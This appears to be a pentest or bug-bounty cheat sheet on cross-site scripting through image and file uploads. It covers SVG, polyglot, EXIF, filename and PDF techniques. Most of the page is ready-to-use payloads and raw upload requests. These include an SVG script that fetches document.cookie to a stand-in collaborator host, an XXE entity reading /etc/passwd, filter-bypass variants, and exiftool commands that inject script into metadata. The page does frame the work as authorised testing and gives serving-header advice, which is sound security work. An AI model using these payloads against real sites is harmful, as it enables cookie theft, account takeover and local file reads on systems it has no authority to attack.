# XSS via Image / File Upload (SVG, PNG, polyglot, EXIF, filename)

**What it is:** Upload a "picture" that the browser executes as script. No web shell needed — the file *is* the payload. Impact depends on **where** it is served: same-origin = session theft/ATO; sandboxed CDN = lower.

## First: check the serving origin & headers
Upload any image, then look at how it comes back:
```http
GET /uploads/9f2a.svg HTTP/1.1
Host: target.com

HTTP/1.1 200 OK
Content-Type: image/svg+xml          ← rendered inline = XSS possible
Content-Disposition: inline
```
Danger signals: `Content-Type: image/svg+xml` served **inline** on the **app origin**, or missing `X-Content-Type-Options: nosniff`, or `Content-Disposition: inline` on user files. Safe-ish: served from a separate sandbox domain with `Content-Disposition: attachment` + `nosniff`.

## 1. SVG XSS (the big one — SVG is XML+JS, not a raster image)
`xss.svg`:
```xml
<?xml version="1.0" standalone="no"?>
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)">
  <script>fetch('https://COLLAB/c?'+document.cookie)</script>
</svg>
```
Upload:
```http
POST /api/avatar HTTP/1.1
Host: target.com
Content-Type: multipart/form-data; boundary=x
Cookie: session=<mine>

--x
Content-Disposition: form-data; name="file"; filename="xss.svg"
Content-Type: image/svg+xml

<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"><script>/*...*/</script></svg>
--x--
```
Then open the returned URL in a browser. Fires when the SVG is loaded **inline** (direct nav, or `<img>`→no, but iframe/direct URL→yes). Confirm:
```http
GET /uploads/xss.svg HTTP/1.1
Host: target.com

HTTP/1.1 200 OK
Content-Type: image/svg+xml
...<svg ... onload="alert(document.domain)">...   ← intact, served on app origin = stored XSS
```

### SVG bypass variants when filtered
- `<svg><foreignObject><iframe src="javascript:alert(1)"></iframe></foreignObject></svg>`
- `<svg><animate onbegin="alert(1)" attributeName=x dur=1s>`
- `<svg><use href="data:image/svg+xml,<svg onload=alert(1)/>">`
- External entity / XXE in SVG (see `03-injection/05-xxe.md`): `<!ENTITY x SYSTEM "file:///etc/passwd">`.
- Rename to bypass ext filter: `xss.svg` → try `.svg` blocked → `xss.svg?.png`, double ext, or content-type spoof (below).

## 2. Extension/content-type spoof to force SVG rendering
Upload SVG bytes but claim PNG, or vice versa, and see which the server trusts:
```http
--x
Content-Disposition: form-data; name="file"; filename="pic.png"
Content-Type: image/svg+xml

<svg xmlns="http://www.w3.org/2000/svg" onload=alert(document.domain)></svg>
--x--
```
If it stores by declared `Content-Type` and later serves `image/svg+xml` → XSS even with a `.png` name. Test all four combos (ext vs magic vs declared type).

## 3. PNG / JPG / GIF polyglot + MIME sniffing
When there is **no** `nosniff` and the browser sniffs content, an image with HTML/JS appended can be served as HTML.
- GIF89a polyglot (valid image header + script):
```
GIF89a=1;/*<svg onload=alert(document.domain)>*/
```
- Append HTML after real PNG/JPG bytes; if a route serves the file with a guessable/empty `Content-Type` and the browser sniffs → executes.
- Confirm by loading the file directly and checking the response `Content-Type` + whether the browser parses it as HTML.

## 4. EXIF / metadata XSS (stored, fires in a viewer)
Inject script into EXIF fields that a gallery/"image details" page reflects unescaped:
```bash
exiftool -Comment='"><img src=x onerror=alert(document.domain)>' pic.jpg
exiftool -Artist='<script>alert(document.domain)</script>' pic.jpg
```
Upload `pic.jpg`; trigger fires when the app renders EXIF (image-detail page, admin media viewer → often **second-order**, see `09-advanced/01`).

## 5. Filename XSS
The filename itself reflected unescaped in a listing/response:
```http
--x
Content-Disposition: form-data; name="file"; filename="<img src=x onerror=alert(document.domain)>.png"
Content-Type: image/png

<png bytes>
--x--
```
Fires wherever the app prints the filename (upload confirmation, file manager, email).

## 6. PDF / office polyglots
PDF with embedded JS, or `.html` disguised — if served inline on-origin, script runs. SVG-in-PDF, HTML-in-DOCX preview.

## Impact by location
- Served **inline on the main app origin** → **stored XSS** → cookie/session theft → ATO. High/critical.
- Served on a **separate sandbox domain** (`usercontent.cdn.com`) → XSS only in that origin, usually low unless it holds auth.
- SVG XXE → local file read / SSRF (separate, often higher).

## Verify it is real (not just a stored file)
1. Load the file URL in a real browser; screenshot `alert(document.domain)` showing the **target's** origin (not `null`/CDN).
2. Prove impact: exfil your own cookie to Collaborator, or read a same-origin `/api/me`.
3. If it only fires on `usercontent.example.com`, state that scope honestly.

## Report notes
Show: the upload request, the stored file served with `Content-Type: image/svg+xml` inline on-origin, and the fired payload with the origin visible. Note whether it is direct (click link) or requires an admin to open it (second-order). Delete the test file after proof if you can.

## Deep cuts — when/where the SVG actually executes
- [ ] **Render context matters:** SVG in an `<img src>` does **not** run script; it runs on **direct navigation**, in an `<iframe>`, `<object>`/`<embed>`, or when the app inlines it into the DOM. Always test the direct file URL and any preview iframe.
- [ ] **`Content-Disposition: attachment` isn't a full fix:** if the file is *also* reachable inline elsewhere (thumbnail route, preview, `?inline=1`, range request, a second CDN path) it still fires. Look for multiple serving routes of the same object.
- [ ] **`nosniff` bypass angles:** even with `nosniff`, `image/svg+xml` served inline executes (it's a real SVG type, not a sniff). And a wrong-but-scriptable declared type (`text/html`, `application/xhtml+xml`) served inline is XSS regardless.
- [ ] **Charset injection:** `Content-Type: image/svg+xml; charset=UTF-7` (legacy) or a reflected charset param → alternate-encoding XSS.
- [ ] **Filename → admin-panel stored XSS:** an HTML/JS filename that's inert on your listing may render unescaped in the **moderation/admin** media view = XSS in a privileged origin (second-order, `09-advanced/01`).
- [ ] **PDF JS / annotations:** `/OpenAction`/`/JavaScript` in a PDF served inline runs in some viewers; PDF with a form that posts to your host.
- [ ] **Blob/`data:` URL rendering:** if the app builds a `blob:`/`data:` URL from the file and injects it into an iframe/anchor, script can run in a controllable origin.
- [ ] **`image/svg+xml` on a cookie-scoped sandbox:** "sandbox CDN" only helps if it shares **no** auth cookie and **no** postMessage bridge with the app — verify, don't assume.

## Tools
`exiftool` (EXIF payloads), Burp, Collaborator/interactsh, `fuxploider` for ext/type fuzzing.
